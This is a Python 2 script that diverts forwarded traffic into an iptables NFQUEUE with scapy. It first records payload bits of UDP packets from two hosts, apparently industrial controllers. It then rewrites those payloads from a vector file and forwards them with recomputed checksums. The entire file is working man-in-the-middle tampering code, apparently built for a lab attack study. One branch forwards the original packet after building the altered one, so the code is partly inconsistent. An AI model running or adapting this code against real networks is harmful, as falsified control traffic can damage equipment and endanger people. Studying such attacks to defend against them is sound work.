#!/usr/bin/env python 
# -*- coding:utf-8 -*-
from scapy.all import *
import time
import numpy as np
from bitdump import *
import binascii
from netfilterqueue import NetfilterQueue
from AL_utils import *
import CIP_sequence
import os

p2_50 = np.zeros(256, dtype=int)
p2_40 = np.zeros(176, dtype=int)
p2_28 = np.zeros(80, dtype=int)
p0_40 = np.zeros(176, dtype=int)
total_length = len(p2_50)+len(p2_40)+len(p2_28)+len(p0_40)
vector = np.hstack((p2_50,p2_40,p2_28,p0_40))
vector = vector.tolist()
modify_time = 0
modify_flag = 0
accept_flag = 0
capture_flag = 'False'
count = 0
start_time = 0
check_time = 0
time_interval = 30


def save(filename, contents):
	fh = open(filename, 'w')
	fh.write(contents)
	fh.close()


def read(filename):
	fh = open(filename, 'r')
	contents = fh.read()
	fh.close()
	return contents


def preprocess(x):
	temp = x.strip('[')
	temp = temp.strip(']')
	final = np.fromstring(temp, dtype=int, sep='. ')
	return final


def handle_packet(packet):
	global modify_flag
	global accept_flag
	global modify_time
	global count
	global vector
	global start_time
	global capture_flag
	global check_time
	pkt = IP(packet.get_payload())
	'''extract pv'''
	if pkt.haslayer("Raw"):
		if pkt["IP"].src == '192.168.0.12':
			if len(pkt[Raw]) == 50:
				stri = binascii.hexlify(str(pkt))
				with open("string.txt", 'w') as i:
					i.write(stri)
	if time.time() - check_time >= 1:
		check_time = time.time()
		states = read('stage_states.txt')
		states = states.split(' ')
		accept_flag = int(states[0])
		modify_flag = int(states[1])
	if accept_flag == 1:
		print 'accept'
		capture_flag = 'False'
		save('capture_flag1.txt', capture_flag)
		packet.accept()
	else:
		if capture_flag == 'True':
			packet.accept()
		else:
			'''start altering packets'''
			if modify_flag == 1:
				start_time = time.time()
				new_vector = np.loadtxt('newvector.txt')
				new_vector = new_vector.tolist()
				if pkt.haslayer('Raw'):
					if pkt['IP'].src == '192.168.0.12' and len(pkt['Raw']) == 32:
						rawpkt = binascii.unhexlify(reconstruct_packet(pkt,new_vector,1,1))
						pktnew = IP(rawpkt)
						del pktnew['IP'].chksum
						del pktnew['UDP'].chksum
						packet.set_payload(str(pktnew))
					if pkt['IP'].src == '192.168.0.12' and len(pkt['Raw']) == 22:
						rawpkt = binascii.unhexlify(reconstruct_packet(pkt,new_vector,1,2))
						pktnew = IP(rawpkt)
						del pktnew['IP'].chksum
						del pktnew['UDP'].chksum
						packet.set_payload(str(pktnew))
					if pkt['IP'].src == '192.168.0.12' and len(pkt['Raw']) == 10:
						rawpkt = binascii.unhexlify(reconstruct_packet(pkt,new_vector,1,3))
						pktnew = IP(rawpkt)
						del pktnew['IP'].chksum
						del pktnew['UDP'].chksum
						packet.set_payload(str(pktnew))
					if pkt['IP'].src == '192.168.0.10' and len(pkt['Raw']) == 22:
						rawpkt = binascii.unhexlify(reconstruct_packet(pkt,new_vector,1,4))
						pktnew = IP(rawpkt)
						del pktnew['IP'].chksum
						del pktnew['UDP'].chksum
						packet.set_payload(str(pkt))
				packet.accept()
			else:
				'''search for the related bits'''
				if time.time() - start_time >= 5:
					vector = np.hstack((p2_50, p2_40, p2_28, p0_40))
					vector = vector.tolist()
					np.savetxt('stage1old.txt',vector,fmt='%d')
					capture_flag = 'True'
					save('capture_flag1.txt', capture_flag)
				elif pkt.haslayer("Raw"):
					if pkt.haslayer("Raw"):
						if pkt["IP"].src == '192.168.0.12':
							if len(pkt[Raw]) == 32:
								a = bitdump(pkt[Raw])
								for j in range(len(a)):
									p2_50[j] = a[j]
							if len(pkt[Raw]) == 22:
								a = bitdump(pkt[Raw])
								for j in range(len(a)):
									p2_40[j] = a[j]
							if len(pkt[Raw]) == 10:
								a = bitdump(pkt[Raw])
								for j in range(len(a)):
									p2_28[j] = a[j]
						if pkt["IP"].src == '192.168.0.10':
							if len(pkt[Raw]) == 22:
								a = bitdump(pkt[Raw])
								for j in range(len(a)):
									p0_40[j] = a[j]
				packet.accept()


if __name__ == '__main__':
	os.system('iptables -t mangle -A FORWARD -j NFQUEUE --queue-num 1')
	nfqueue = NetfilterQueue()
	nfqueue.bind(1, handle_packet,10)
	try:
		print "[*] starting NFQUEUE"
		start_time = time.time()
		check_time = time.time()
		print "start_time", start_time
		nfqueue.run()
	except KeyboardInterrupt:
		os.system('sudo iptables -t mangle -F')
		os.system('sudo sh start_lvl0.sh')
		print "[*] stopping NFQUEUE"
		nfqueue.unbind()
